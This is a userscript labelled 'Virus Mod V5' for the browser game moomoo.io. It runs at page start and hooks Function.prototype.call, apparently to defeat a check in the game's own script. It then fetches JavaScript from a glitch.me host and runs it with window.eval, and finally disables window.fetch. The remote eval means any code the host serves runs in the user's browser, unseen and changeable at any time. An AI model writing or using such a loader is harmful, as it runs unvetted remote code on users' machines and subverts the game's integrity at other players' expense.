// ==UserScript==
// @name        Virus Mod V5
// @version     5
// @description Was known to be the worst skidded mod... Keyword "Was"....
// @author      VirusterDev & reload detectors, collision detectors by memeganoob & some small fixes by pulsar
// @match       *://moomoo.io/*
// @match       *://sandbox.moomoo.io/*
// @run-at      document-start
// @grant       none
// ==/UserScript==
let falsed = true
Function.prototype.call = new Proxy(Function.prototype.call,{
apply(target, thisArg, argumentsList) {
    if(window.loadedScript == true && falsed){falsed = false;
                                             return false;
                                             }
return Reflect.apply(target, thisArg, argumentsList)
}
})
let xml = new XMLHttpRequest()
xml.open('GET', 'https://organized-pollen-couch.glitch.me/script.js')
xml.onreadystatechange = function() {
    if (this.readyState == this.DONE) {
        if (this.onreadystatechange) {
            xml.onreadystatechange = null;
            window.eval(xml.response)
        }
    }
};

    xml.send();
window.fetch = ()=>{return false;}
